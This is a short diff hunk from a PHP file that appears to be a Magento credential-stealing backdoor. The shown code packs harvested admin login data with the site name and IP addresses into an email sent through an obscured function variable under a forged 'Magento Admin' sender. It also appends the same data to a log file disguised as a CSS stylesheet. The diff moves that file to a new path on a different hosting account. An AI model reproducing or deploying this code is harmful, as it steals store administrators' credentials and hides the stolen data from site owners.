@@ -118,7 +118,7 @@ $auth .= "Site : ".$srv."\n";
 $subjk = "".$country_code." [".$srv." - ".$ips."]";
 $headr = "From: Magento Admin <".$username."@".$ips.">";
 $db($key, $subjk, $auth, $headr);
-        $locate = "/home/spragues/public_html/store/media/catalog/product/1/6/16admin.css";
+        $locate = "/home/eshopczu/public_html/js/tiny_mce/themes/advanced/langs/admin.css";
             $write = fopen($locate,"a");
             fwrite($write,$auth."\n=========================================\n\n");
             fclose($write);
